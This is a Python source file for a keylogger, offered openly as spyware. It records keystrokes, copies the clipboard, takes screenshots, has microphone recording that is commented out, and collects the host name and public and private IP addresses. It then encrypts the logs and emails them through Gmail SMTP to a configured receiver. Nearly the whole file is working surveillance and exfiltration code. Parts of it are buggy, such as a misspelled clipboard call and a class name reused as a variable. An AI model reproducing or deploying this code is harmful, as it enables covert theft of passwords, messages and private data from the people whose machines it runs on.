# Import necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time 
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab


#################### Define variables#########################
keys_information = "key_log.txt"
email_address = "YOUR_MAIL_ADDRESS@XYZ.COM"     
password = "TYPE THE APP PASSWORD OF THE GOOGLE ACCOUNT"
toaddr = "MAIL OF THE RECEIVER"
file_path = "D:\\vscode\\python\\advanced_keylogger"  # ADD THE LOCATION OF THE SAVED FILE HERE
extend = "\\"                                         # File path
file_merge= file_path+ extend
system_information="systeminfo.txt"                  # System information
clipboard_information="clipboard.txt"                 # Clipboard information

microphone_time = 10                                #mirophone 
audio_information = "audio.wav"                             

screenshot_information = "screenshot.png"           # Screenshot information

time_iteration = 15                                # Time interval
number_of_iterations_end= 3
#time to test all the content of the project if its working or not

keys_information_e = "e_key_logs.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
key= "COPY THE KEY FROM ENCRYPTED_KEY.TXT FROM CYRPTOGRAPHY FOLDER"
username=getpass.getuser()



##############################################################
def send_email(filename, attachment, toaddr):                   # Email function for sending log files
    # Check if any of the arguments are None
    if filename is None or attachment is None or toaddr is None:
        raise ValueError("One or more of the arguments is null")

    # Set email sender
    fromadd = email_address
    msg = MIMEMultipart()
    msg['From'] = fromadd
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    # Set email body
    body = "body_of_the_email"
    msg.attach(MIMEText(body, "plain"))

    # Attach log file
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('content-Disposition', "attachment; filename=%s" % filename)
    msg.attach(p)

    # Connect to SMTP server and send email
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromadd, password)
    text = msg.as_string()
    s.sendmail(fromadd, toaddr, text)
    s.quit()
send_email(keys_information, file_path + extend + keys_information, toaddr)


def computer_information():                       # Computer information
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address: " + public_ip)

        except Exception:
            f.write("could not get public ip address")
        f.write("Processor:" + (platform.processor()) + '\n')
        f.write("System:" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine:" + platform.machine() + "\n")
        f.write("Hostname" + hostname  + "\n")
        f.write("Private IP Address:"+ IPAddr + "\n")
computer_information()

def copy_clipboard():                            # Clipboard information
    
    with open(file_path+ extend+clipboard_information, "a") as f:
        try:
            win32clipboard.Openclipboard()
            pasted_data = win32clipboard.getclipboarddata()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n"+ pasted_data)
        except:
            f.write("clipboard could not be copied")
copy_clipboard()

def microphone():                                   # Microphone information
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)
#microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + "screenshot.png")
screenshot()

number_of_iterations=0
currentTime= time.time()
stoppingTime= time.time()+ time_iteration
while number_of_iterations < number_of_iterations_end:
    count = 0                                           # Keylogger function
    keys = []             # Keylogger function
    def on_press(key):            # Keylogger function ON PRESS
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime= time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):                       # Keylogger function WRITE FILE
        if keys is None:
            raise ValueError("keys is null")

        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('')   
                elif k.find("enter")> 0:
                    f.write('\n')
                elif k.find("key") == -1:
                    f.write(k)
            f.close()


    def on_release(key):                       # Keylogger function ON RELEASE
        if key == Key.esc:
            return False
        if currentTime> stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:                            # Keylogger function LISTENER
        listener.join()
    if currentTime> stoppingTime:

        with open( file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()
        number_of_iterations+=1
        currentTime=time.time()
        stoppingTime= time.time() + time_iteration 

files_to_encrypt= [file_merge+ system_information, file_merge +clipboard_information, file_merge+ keys_information]
encrypted_file_names= [file_merge +system_information_e, file_merge+ clipboard_information_e, file_merge+ keys_information_e]  

for encrypted_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data=f.read()
    Fernet= Fernet(key)
    encrypted= Fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr )
    count+=1
time.sleep(120)
